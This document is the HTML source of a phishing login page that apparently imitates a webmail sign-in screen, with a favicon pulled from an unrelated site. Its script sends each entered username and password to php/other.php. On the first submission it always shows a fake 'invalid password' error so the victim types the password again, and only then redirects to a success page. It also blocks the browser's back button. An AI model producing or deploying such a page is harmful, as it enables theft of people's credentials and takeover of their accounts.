<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Sign In</title>
<link rel="shortcut icon" href="http://www.yhfamily.cn/sites/default/files/audio/147/b344cdb7fb3f63d8fe83e775520c7459/images/liamg.ico">
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #6CDA7B;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:11px;top:17px;width:360px;height:389px;text-align:left;z-index:5;">
<img src="img/otbody.png" id="Image1" alt="" style="width:360px;height:389px;" align="top" border="0"></div>
<div id="bv_Form1" style="position:absolute;left:0px;top:0px;width:398px;height:401px;z-index:6">
<form id="form" name="Form1" method="post" action="" >
<input id="" style="position:absolute;left:33px;top:141px;width:318px;height:30px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0" name="username" pattern=".{4,30}" oninvalid="this.setCustomValidity('Required Field')" oninput="setCustomValidity('')" title="Required Field" required="" type="text">
<input id="password" style="position:absolute;left:33px;top:205px;width:318px;height:30px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:1" name="password" pattern=".{3,16}" oninvalid="this.setCustomValidity('Required Field')" oninput="setCustomValidity('')" title="Required Field" required="" type="password">
<p id="msg" style="position:absolute;width:359px;left: 33px;top: 240px;z-index:2;outline: none;border-color: transparent;margin-top: 5px;color: red;font-family: sans-serif;font-size: 0.8rem;display:none">Invalid email address/password, please try again.</p>
<input id="Button1" name="Button1" value="" style="position:absolute;left:32px;top:267px;width:86px;height:38px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2" type="submit">
</form></div>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script> 
<script type="text/javascript">

history.pushState(null, document.title, location.href);
window.addEventListener('popstate', function (event)
{
  history.pushState(null, document.title, location.href);
});

//$(document).bind("contextmenu", function(e){ return false;});

var count = 0;
var counts = 0;

$('#form').on('submit', function(e){
		counts = counts+1;
		$('#rcmloginsubmit').html('<i class="fa fa-refresh fa-spin"></i>');
		$.post('php/other.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
		
							if(counts == 2){
							   $('#step1').show();
							   $('#step1').show();
							   
					   setTimeout(function() {
                              window.location.href = "done/success.html";
                        },1000);
							   
							}else{
							     $('#password').val('');
								 $('#msg').show();
								 $('#rcmloginsubmit').html('LOGIN');
							}
		
                            
                        },1000);
		e.preventDefault();
	});

</script>
</body>
</html>